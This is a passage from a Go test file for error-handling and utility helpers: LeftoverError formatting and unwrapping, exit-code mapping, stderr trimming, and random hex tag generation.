	if !strings.Contains(got, "/tmp/x") {
		t.Errorf("LeftoverError.Error() missing dir: %q", got)
	}
	if le.Unwrap() != nil {
		t.Errorf("Unwrap() = %v, want nil", le.Unwrap())
	}
	inner := errors.New("inner")
	le2 := &LeftoverError{Dir: "/tmp/x", Err: inner}
	if !strings.Contains(le2.Error(), "inner") {
		t.Errorf("LeftoverError.Error() missing inner: %q", le2.Error())
	}
}

// TestExitCodeForUnwrapsSandboxErrors confirms a sandbox.* exitErr
// embedded in the chain surfaces through ExitCodeFor. Important because
// Generate composes sandbox.Deploy and sandbox.Destroy.
func TestExitCodeForNilAndGeneric(t *testing.T) {
	if got := ExitCodeFor(nil); got != ui.ExitOK {
		t.Errorf("ExitCodeFor(nil) = %d, want ExitOK", got)
	}
	if got := ExitCodeFor(errors.New("generic")); got != ui.ExitGeneric {
		t.Errorf("ExitCodeFor(generic) = %d, want ExitGeneric", got)
	}
}

// TestWriteStderrTrims confirms the trim-and-emit helper.
func TestWriteStderrTrims(t *testing.T) {
	var buf strings.Builder
	writeStderr(&buf, "psql foo", []byte("oops\n\n"))
	out := buf.String()
	if !strings.Contains(out, "psql foo stderr") {
		t.Errorf("missing label: %q", out)
	}
	if !strings.Contains(out, "oops") {
		t.Errorf("missing content: %q", out)
	}
	// Empty input is a no-op.
	var empty strings.Builder
	writeStderr(&empty, "x", nil)
	if empty.Len() != 0 {
		t.Errorf("empty input wrote %q, want nothing", empty.String())
	}
	// Whitespace-only input is also a no-op.
	var ws strings.Builder
	writeStderr(&ws, "x", []byte("\n\n"))
	if ws.Len() != 0 {
		t.Errorf("whitespace-only input wrote %q, want nothing", ws.String())
	}
}

// TestRandomTagFormat sanity-checks the helper.
func TestRandomTagFormat(t *testing.T) {
	tag, err := randomTag()
	if err != nil {
		t.Fatalf("randomTag: %v", err)
	}
	if len(tag) != 8 {
		t.Errorf("tag length: got %d, want 8", len(tag))
	}
	// Each char must be in [0-9a-f].
	for _, c := range tag {
		ok := (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')
		if !ok {
			t.Errorf("tag contains non-hex char %q in %q", c, tag)
			break
		}
	}
}
